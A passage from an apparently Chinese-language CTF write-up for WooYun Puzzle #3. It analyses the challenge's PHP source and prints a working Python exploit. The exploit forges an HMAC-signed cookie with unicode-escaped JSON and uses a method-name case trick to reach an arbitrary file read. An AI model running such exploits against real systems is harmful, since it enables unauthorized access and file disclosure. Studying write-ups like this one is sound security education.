<span class="o">{</span><span class="s2">&quot;internal&quot;</span>:<span class="o">[</span><span class="s2">&quot;zend_version&quot;</span>,...<span class="o">]</span>,<span class="s2">&quot;user&quot;</span>:<span class="o">[</span><span class="s2">&quot;rand_str&quot;</span>,<span class="s2">&quot;output&quot;</span>,<span class="s2">&quot;check_csrf_token&quot;</span>,<span class="s2">&quot;show_form_page&quot;</span>,<span class="s2">&quot;show_error_page&quot;</span>,<span class="s2">&quot;_fd_init&quot;</span>,<span class="s2">&quot;fd_show_source&quot;</span>,<span class="s2">&quot;fd_config&quot;</span>,<span class="s2">&quot;fd_error&quot;</span>,<span class="s2">&quot;fg_safebox&quot;</span><span class="o">]}</span></code></pre></div>

<p>主要关注的是最后一个数组中用户定义的函数，哎呦，有个fd_show_source的函数，试试没准flag就出来了。</p>

<h1 id="x02-">0x02 绕过</h1>

<hr />

<p>事情并没有我们想象的那么简单，看来是作者又给我们下了一个套，fd_show_source函数输出整理如下（已加个人注解）：</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="sd">/**</span>
<span class="sd"> * Created by PhpStorm.</span>
<span class="sd"> * User: phithon</span>
<span class="sd"> * Date: 16/6/8</span>
<span class="sd"> * Time: 上午12:24</span>
<span class="sd"> */</span> 

<span class="k">class</span> <span class="nc">SafeBox</span> <span class="p">{</span> 

    <span class="c1">//貌似可产生任意文件读取</span>
    <span class="k">private</span> <span class="k">function</span> <span class="nf">_read_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>
        <span class="k">return</span> <span class="nb">file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
    <span class="p">}</span>   

    <span class="c1">//通过POST filename可读取任意文件</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">read</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&quot;box.txt&quot;</span><span class="p">;</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
    <span class="p">}</span>   

    <span class="k">public</span> <span class="k">function</span> <span class="nf">view</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$lines</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_file</span><span class="p">(</span><span class="s1">&#39;box.txt&#39;</span><span class="p">);</span>
        <span class="nv">$i</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;i&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;i&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">return</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$lines</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$lines</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&quot;None&quot;</span><span class="p">;</span>
    <span class="p">}</span>   

    <span class="k">public</span> <span class="k">function</span> <span class="nf">alist</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$lines</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_file</span><span class="p">(</span><span class="s1">&#39;box.txt&#39;</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$lines</span><span class="p">;</span>
    <span class="p">}</span>   

    <span class="k">public</span> <span class="k">function</span> <span class="nf">random</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$lines</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_file</span><span class="p">(</span><span class="s1">&#39;box.txt&#39;</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$lines</span><span class="p">[</span><span class="nb">array_rand</span><span class="p">(</span><span class="nv">$lines</span><span class="p">)];</span>
    <span class="p">}</span>
<span class="p">}</span>   

<span class="k">function</span> <span class="nf">_fd_init</span><span class="p">()</span>
<span class="p">{</span>
    <span class="c1">//定义role必须为guest</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;userinfo&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span>
        <span class="s2">&quot;role&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;guest&quot;</span>
    <span class="p">];</span>                                                                                  <span class="c1">//初始化role为guest</span>
    <span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;userinfo&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;userinfo&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>   <span class="c1">//base64解码cookie userinfo</span>
    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">)</span> <span class="o">||</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>   

    <span class="nv">$h1</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>                                                       <span class="c1">//前32位为h1</span>
    <span class="nv">$h2</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>                                                          <span class="c1">//后32位为h2</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$h1</span> <span class="o">!==</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s2">&quot;md5&quot;</span><span class="p">,</span> <span class="nv">$h2</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]))</span> <span class="p">{</span>                        <span class="c1">//再次hamc_md5校验(1)</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>   

    <span class="c1">//防止身份伪造</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$h2</span><span class="p">,</span> <span class="s2">&quot;admin&quot;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">||</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$h2</span><span class="p">,</span> <span class="s2">&quot;user&quot;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>               <span class="c1">//防止h2中出现&quot;admin&quot;和&quot;user&quot;(2)</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$s</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$h2</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>                                                        <span class="c1">//json解码h2，并转换成数组</span>
    <span class="nv">$s</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strval</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]);</span>                                                    <span class="c1">//$s[&#39;role&#39;]转为字符串(3)</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="p">{</span>                                                         <span class="c1">//再次进行身份对比</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;userinfo&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;userinfo&quot;</span><span class="p">],</span> <span class="nv">$s</span><span class="p">);</span>                     <span class="c1">//用h2中的role替换session中userinfo的role</span>
    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
<span class="p">}</span>   

<span class="k">function</span> <span class="nf">fd_show_source</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
<span class="p">}</span>   

<span class="c1">//包含config.php 其中可能有flag？</span>
<span class="k">function</span> <span class="nf">fd_config</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="k">include_once</span> <span class="nx">__DIR__</span> <span class="o">.</span> <span class="s2">&quot;/config.php&quot;</span><span class="p">;</span>
<span class="p">}</span>   

<span class="k">function</span> <span class="nf">fd_error</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="s2">&quot;Error: </span><span class="si">{</span><span class="nv">$msg</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="p">}</span>   

<span class="k">function</span> <span class="nf">fg_safebox</span><span class="p">()</span>
<span class="p">{</span>
    <span class="nx">_fd_init</span><span class="p">();</span>                                                                         <span class="c1">//初始化</span>
    <span class="nv">$config</span> <span class="o">=</span> <span class="nx">fd_config</span><span class="p">();</span>
    <span class="nv">$action</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>                          <span class="c1">//指定action</span>
    <span class="nv">$role</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;userinfo&quot;</span><span class="p">][</span><span class="s1">&#39;role&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;userinfo&quot;</span><span class="p">][</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$role</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;user&#39;</span><span class="p">]))</span> <span class="p">{</span>                                           <span class="c1">//判断是否具有权限(1)</span>
        <span class="k">return</span> <span class="nx">fd_error</span><span class="p">(</span><span class="s1">&#39;Permission denied!!&#39;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$action</span><span class="p">,</span> <span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">][</span><span class="s1">&#39;admin&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$role</span> <span class="o">!=</span> <span class="s2">&quot;admin&quot;</span><span class="p">)</span> <span class="p">{</span>               <span class="c1">//判读行为权限(2)</span>
        <span class="k">return</span> <span class="nx">fd_error</span><span class="p">(</span><span class="s1">&#39;Admin permission denied!!&#39;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$box</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SafeBox</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">method_exists</span><span class="p">(</span><span class="nv">$box</span><span class="p">,</span> <span class="nv">$action</span><span class="p">))</span> <span class="p">{</span>                                                  <span class="c1">//判断对象方法是否存在(3)</span>
        <span class="k">return</span> <span class="nb">call_user_func</span><span class="p">([</span><span class="nv">$box</span><span class="p">,</span> <span class="nv">$action</span><span class="p">]);</span>                                         <span class="c1">//调用相应方法(4)</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span></code></pre></div>

<p>首先在初始化_fd_init()中，要点分析如下：</p>

<ol>
  <li>再次hamc_md5校验：这里的校验好说，毕竟<code>SECRET_KEY</code>已经知晓，带上个<code>h1</code>就好</li>
  <li>防止h2中出现”admin”和”user”：这里使用了strpos来查看字符串中是否存在身份伪造，而且使用<code>！==</code>很规范，从源码基本也没看出什么破绽</li>
  <li>$s[‘role’]转为字符串：strval会将数组类型变得没有意义，也就想不出办法绕过对”admin”身份的检验</li>
</ol>

<p>在fg_safebox()中第一关就是要判断其身份，要求其为”admin”或”user”。结合以上的分析，admin的两次检验我是绕不过去了我认了。所以就开始琢磨能不能使最终的<code>$role</code>为”user”,而strpos约束我们在$h2中不能出现”user”,要不然我们编码试试？哈哈，这里的<code>$s = json_decode($h2, true);</code>就是等着我们利用的，可以将”user”进行unicode编码成为<code>\u0075\u0073\u0065\u0072</code>,这样在strpos中就不会检验出来，而且经过json_decode最终还原成”user”。</p>

<p>在(2)判读行为权限中，加入$box对象的read方法不在$config[‘role’][‘admin’]数组内，那么就不会判断<code>$role != "admin"</code>，进而产生绕过。我们再修改一下原先的代码（new-2.py）如下：</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">hmac</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="nb">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
<span class="n">sys</span><span class="o">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s">&#39;utf-8&#39;</span><span class="p">)</span> 

<span class="n">url</span> <span class="o">=</span> <span class="s">&quot;http://0dac0a717c3cf340e.jie.sangebaimao.com:82/&quot;</span>
<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
<span class="n">str_list</span> <span class="o">=</span> <span class="s">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>
<span class="n">re_csrf_token</span> <span class="o">=</span> <span class="s">r&#39;(?&lt;=value=&quot;).*?(?=&quot;)&#39;</span>
<span class="n">header</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;X-Requested-With&#39;</span><span class="p">:</span> <span class="s">&#39;XMLHttpRequest&#39;</span><span class="p">}</span>
<span class="n">action</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">method</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>    

<span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
    <span class="n">d</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)):</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
            <span class="k">if</span> <span class="n">token</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]:</span>
                <span class="n">d</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
                <span class="k">break</span>
    <span class="k">return</span> <span class="n">d</span>    

<span class="k">def</span> <span class="nf">guess</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">s</span><span class="p">,</span><span class="n">a</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
        <span class="n">r</span> <span class="o">=</span> <span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="mi">31</span><span class="o">+</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="mi">62</span><span class="o">-</span><span class="n">d</span><span class="p">[</span><span class="mi">28</span><span class="o">+</span><span class="n">i</span><span class="p">])</span><span class="o">%</span><span class="mi">62</span>
        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="n">key</span> <span class="o">=</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">result</span><span class="p">)</span> 

    <span class="k">return</span> <span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span>    

<span class="k">def</span> <span class="nf">create_cookie</span><span class="p">(</span><span class="n">k</span><span class="p">):</span>
    <span class="n">h2</span> <span class="o">=</span> <span class="s">r&#39;{&quot;role&quot;:&quot;\u0075\u0073\u0065\u0072&quot;}&#39;</span>
    <span class="n">h1</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">h2</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
    <span class="k">return</span> <span class="p">{</span><span class="s">&#39;userinfo&#39;</span><span class="p">:</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">h1</span><span class="o">+</span><span class="n">h2</span><span class="p">)}</span> 

<span class="n">r0</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="n">token0</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re_csrf_token</span><span class="p">,</span><span class="n">r0</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">d0</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">token0</span><span class="p">,</span><span class="n">str_list</span><span class="p">)</span>
<span class="n">payload0</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;submit&#39;</span><span class="p">:</span><span class="s">&#39;go&#39;</span><span class="p">,</span> <span class="s">&#39;CSRF_TOKEN&#39;</span><span class="p">:</span><span class="n">token0</span><span class="p">,</span> <span class="s">&#39;act&#39;</span><span class="p">:</span><span class="n">action</span><span class="p">,</span> <span class="s">&#39;key&#39;</span><span class="p">:</span><span class="s">&#39;1234567&#39;</span><span class="p">}</span>
<span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload0</span><span class="p">)</span>
<span class="n">r1</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="n">token1</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re_csrf_token</span><span class="p">,</span><span class="n">r1</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">d1</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">token1</span><span class="p">,</span><span class="n">str_list</span><span class="p">)</span>
<span class="n">pre</span> <span class="o">=</span>  <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="n">d0</span><span class="o">+</span><span class="n">d1</span>
<span class="n">secret</span><span class="p">,</span><span class="n">key</span> <span class="o">=</span> <span class="n">guess</span><span class="p">(</span><span class="n">pre</span><span class="p">,</span><span class="n">str_list</span><span class="p">,</span><span class="n">action</span><span class="p">)</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="n">create_cookie</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
<span class="n">payload1</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;submit&#39;</span><span class="p">:</span><span class="s">&#39;go&#39;</span><span class="p">,</span> <span class="s">&#39;CSRF_TOKEN&#39;</span><span class="p">:</span><span class="n">token1</span><span class="p">,</span> <span class="s">&#39;act&#39;</span><span class="p">:</span><span class="n">action</span><span class="p">,</span> <span class="s">&#39;method&#39;</span><span class="p">:</span><span class="n">method</span><span class="p">,</span> <span class="s">&#39;key&#39;</span><span class="p">:</span><span class="n">key</span><span class="p">}</span>
<span class="n">r2</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload1</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>  

<span class="k">if</span> <span class="s">&#39;Permission deny!!&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">&#39;[+]Done!&#39;</span>
    <span class="k">print</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span></code></pre></div>

<p>相应的get-2.py也简单如下：</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
<span class="c">#coding=utf-8   </span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">subprocess</span>   

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">&#39;python&#39;</span><span class="p">,</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]])</span>
    <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">output</span>
        <span class="k">break</span></code></pre></div>

<p>输出如下：</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python get-2.py new-2.py fg_safebox <span class="nb">read</span>
<span class="o">[</span>+<span class="o">]</span>Done!
<span class="s2">&quot;Error: Admin permission denied!!&quot;</span></code></pre></div>

<p>在简单尝试之后”user”只能调用$box对象的view、alist和view方法，唯独不能使用read方法，如果说一定要用read方法，这里估计也是无法绕过去了。不急，继续往下看看有没有思路，在(4)调用相应方法中，其会和PHP对象有关联，而就我知道的和搜索到的，大多都是PHP对象注入问题，而这里也没有魔术方法和序列化之类的东西，猜测也就不是这个考察点。那么关注的重心就移到了(3)判断对象方法是否存在，在使用method_exists的时候会不会出现什么问题呢，看<a href="https://github.com/php/php-src/blob/f8faffe37edd74e0314f74436825bfcf5be78a49/Zend/zend_builtin_functions.c">源码</a>之：</p>

<p><img src="/images/20160628/5.png" alt="" /></p>

<p>唉呀妈呀，其中一句<code>lcname = zend_string_tolower(method_name);</code>，就猜测这里是先将方法名转成小写再进行判断和利用的。我们这里就可以大小写绕过，使”user”调用的方法为<code>READ</code>，进入(4)中的函数调用，加上filename的POST就可以进行任意文件读取啦～</p>

<h1 id="x03-">0x03 寻找</h1>

<hr />

<p>赶紧读读config.php里面有没有什么东西，结果：</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>+<span class="o">]</span>Done!
<span class="o">[</span><span class="s2">&quot;&lt;?php\n&quot;</span>,<span class="s2">&quot;\/**\n&quot;</span>,<span class="s2">&quot; * Created by PhpStorm.\n&quot;</span>,<span class="s2">&quot; * User: phithon\n&quot;</span>,<span class="s2">&quot; * Date: 16\/6\/8\n&quot;</span>,<span class="s2">&quot; * Time: \u4e0a\u534812:24\n&quot;</span>,<span class="s2">&quot; *\/\n&quot;</span>,<span class="s2">&quot;\n&quot;</span>,<span class="s2">&quot;return [\n&quot;</span>,<span class="s2">&quot;    \&quot;role\&quot; =&gt; [\n&quot;</span>,<span class="s2">&quot;        \&quot;admin\&quot; =&gt; [\n&quot;</span>,<span class="s2">&quot;            \&quot;read\&quot;\n&quot;</span>,<span class="s2">&quot;        ],\n&quot;</span>,<span class="s2">&quot;        \&quot;user\&quot; =&gt; [\n&quot;</span>,<span class="s2">&quot;            \&quot;view\&quot;, \&quot;alist\&quot;, \&quot;random\&quot;\n&quot;</span>,<span class="s2">&quot;        ]\n&quot;</span>,<span class="s2">&quot;    ]\n&quot;</span>,<span class="s2">&quot;];&quot;</span><span class="o">]</span></code></pre></div>

<p>看来还是要有点渗透思维去读读配置文件什么的，看看flag到底藏在哪，参考<a href="https://www.91ri.org/7911.html">Linux渗透与提权：技巧总结篇</a>与<a href="https://www.91ri.org/7459.html">Linux提权后获取敏感信息的方法与途径</a>，把里面cat的文件全部集中一起，写个脚本跑一遍及可发现flag，代码与之前的类似，详见<a href="https://github.com/Larryxi/My_tools/tree/master/puzzle2016">github</a></p>


</div>
<div class="container">
    <ul class="rrssb-buttons clearfix">
    <li class="rrssb-email">
    <!-- Replace subject with your message using URL Endocding: http://meyerweb.com/eric/tools/dencoder/ -->
        <a href="mailto:?subject=不插电 · WooYun Puzzle#3 Write up&amp;body=Check out: https://larryxi.github.io/wooyun-pluzze-3-write-up.html">
            <span class="rrssb-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 28"><path d="M20.11 26.147c-2.335 1.05-4.36 1.4-7.124 1.4C6.524 27.548.84 22.916.84 15.284.84 7.343 6.602.45 15.4.45c6.854 0 11.8 4.7 11.8 11.252 0 5.684-3.193 9.265-7.398 9.3-1.83 0-3.153-.934-3.347-2.997h-.077c-1.208 1.986-2.96 2.997-5.023 2.997-2.532 0-4.36-1.868-4.36-5.062 0-4.75 3.503-9.07 9.11-9.07 1.713 0 3.7.4 4.6.972l-1.17 7.203c-.387 2.298-.115 3.3 1 3.4 1.674 0 3.774-2.102 3.774-6.58 0-5.06-3.27-8.994-9.304-8.994C9.05 2.87 3.83 7.545 3.83 14.97c0 6.5 4.2 10.2 10 10.202 1.987 0 4.09-.43 5.647-1.245l.634 2.22zM16.647 10.1c-.31-.078-.7-.155-1.207-.155-2.572 0-4.596 2.53-4.596 5.53 0 1.5.7 2.4 1.9 2.4 1.44 0 2.96-1.83 3.31-4.088l.592-3.72z"/></svg></span>
            <span class="rrssb-text">email</span>
        </a>
    </li>
    <li class="rrssb-facebook">
<!--  Replace with your URL. For best results, make sure you page has the proper FB Open Graph tags in header: https://developers.facebook.com/docs/opengraph/howtos/maximizing-distribution-media-content/ -->
        <a href="https://www.facebook.com/sharer/sharer.php?u=https://larryxi.github.io/wooyun-pluzze-3-write-up.html" class="popup">
            <span class="rrssb-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 29 29"><path d="M26.4 0H2.6C1.714 0 0 1.715 0 2.6v23.8c0 .884 1.715 2.6 2.6 2.6h12.393V17.988h-3.996v-3.98h3.997v-3.062c0-3.746 2.835-5.97 6.177-5.97 1.6 0 2.444.173 2.845.226v3.792H21.18c-1.817 0-2.156.9-2.156 2.168v2.847h5.045l-.66 3.978h-4.386V29H26.4c.884 0 2.6-1.716 2.6-2.6V2.6c0-.885-1.716-2.6-2.6-2.6z"/></svg></span>
            <span class="rrssb-text">facebook</span>
        </a>
    </li>
    <li class="rrssb-twitter">
        <!-- Replace href with your Meta and URL information  -->
        <a href="https://twitter.com/intent/tweet?text=不插电 · WooYun Puzzle#3 Write up&amp;url=https://larryxi.github.io/wooyun-pluzze-3-write-up.html" class="popup">
